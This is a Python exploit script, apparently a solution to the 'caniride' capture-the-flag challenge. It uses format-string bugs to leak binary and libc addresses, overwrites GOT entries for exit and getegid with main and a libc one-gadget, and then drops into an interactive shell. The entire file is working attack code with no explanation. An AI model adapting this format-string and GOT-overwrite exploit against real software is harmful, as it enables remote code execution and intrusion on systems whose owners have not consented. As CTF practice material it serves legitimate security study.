#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./caniride')
host = args.HOST or 'challs.actf.co'
port = int(args.PORT or 31228)

gdbscript = '''
tbreak main
b *main+533
continue
continue
continue
'''.format(**locals())

libc=ELF("./libc.so.6")
io = start()

payload=f"%{(0x69)}c%16$hhn%12$p"
sla(b"Name: ", payload)
sla(b"Pick your driver: ", b"-3")
reu(b"Hi, this is ")
exe.address = uu64(ren(6))-0x35a8
pb()
sla(b"So... tell me a little about yourself: ", p(exe.address+0x3300) + p(exe.address+0x3300+2) + p(exe.address+0x3300+4) + p(0xdeadbeef) )
# sleep(3)
reu(b"0x")
# sleep(3)
libc.address=int(b"0x" + ren(12), 16)-0x2229e8
lb()

ofst=(libc.address+0x491ff+117&0x00000000ffff)
payload=""
pop_4 = libc.address+0x460a3
payload+=(f"%{((libc.address+0x00000000020000) + 0xfff &0x00000000ffff)}c%16$hn")
payload+="AAA"
payload=payload.encode('utf-8')
payload+=p(0x1337)
payload+=p(exe.address + 0x14f6)
csu_init=exe.address + 0x14f6
# payload=fmtstr_payload(16-5, {exe.got.exit : exe.address + 0x14f6}, write_size='short')
payload=fmtstr_payload(16-5, {exe.got.exit : exe.sym.main}, write_size='short')
# payload=payload.split(b'$hn')
print(hexdump(payload))
print(len(payload))
sla(b"Name: ", payload[:39])
sla(b"Pick your driver: ", b"0")
sleep(3)
pop_rax = p(libc.address + 0x000000000473ff)
pop_rdx = p(libc.address + 0x000000000e5a42)
pop_rsi = p(libc.address + 0x0000000002604f)
pop_rdi = p(libc.address + 0x00000000023b72)
syscall = libc.address + 0x0000000002284d
binsh = libc.address + 0x1b45bd
null_rdx_syscall = libc.address + 0x00000000112d4f
sla(b"So... tell me a little about yourself: ", payload[40:] + b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga")
sleep(3)

payload=fmtstr_payload(16-5, {exe.got.getegid : libc.address + 0xe3b34}, write_size='short')
# payload=fmtstr_payload(16-5, {exe.got.getegid : libc.sym.gets}, write_size='short')
sla(b"Name: ", payload[:39])
sla(b"Pick your driver: ", b"0")
sleep(3)
sla(b"So... tell me a little about yourself: ", payload[40:] + b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga")
sleep(3)
# sla(b"So... tell me a little about yourself: ", p(exe.address+0x3300) + p(exe.address+0x3300+2) + p(exe.address+0x3300+4) + p(0xdeadbeef) )
# sla(b"So... tell me a little about yourself: ", (p(exe.address+8+8+8+0x32f8) + p(exe.address+8+8+8+0x32f8+2) + p(0x2) + p(exe.address+0x0000000000101a) + pop_rdi + p(binsh) + p(libc.sym.system) ) )
# sleep(3)
# print(re())
io.interactive()
